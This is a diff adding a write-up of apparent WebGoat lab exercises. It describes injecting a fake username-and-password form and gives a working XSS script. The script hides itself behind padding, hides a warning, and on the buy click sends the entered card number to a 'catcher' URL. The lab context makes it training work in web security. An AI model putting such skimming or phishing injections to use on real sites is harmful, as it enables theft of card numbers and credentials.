@@ -3,3 +3,27 @@
 
 
 Part 1 Explanation:
+insert a form that asks the user to input their username and password. When user clicks the submit button, the username and password are read by my javascript and post to the url.
+
+
+Part 2 Explanation:
+Here is the source code which I inserted into input2. This starts with many spaces so the input2 text box does not show the code to the user. Also, I hide the warning message.
+The code listens to the click event, and then send the card number to the url.
+//Using an addEventListener() function: source from https://www.w3schools.com/jsref/event_onclick.asp -->
+                                                                                                                       
+<script>
+    document.getElementById("message").hidden = true;
+    const button = document.getElementsByName("buy");
+    button[0].addEventListener("click", myFunction);
+    function myFunction () { 
+        let cardNumber = document.getElementsByName("input1")[0].value;
+        cardNumber.hidden = true;
+        console.log('hello!');
+        console.log(cardNumber);
+        let theUrl = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=___" + cardNumber;
+        console.log(theUrl);
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "POST", theUrl, false );
+        xmlHttp.send( null );
+    };
+</script>
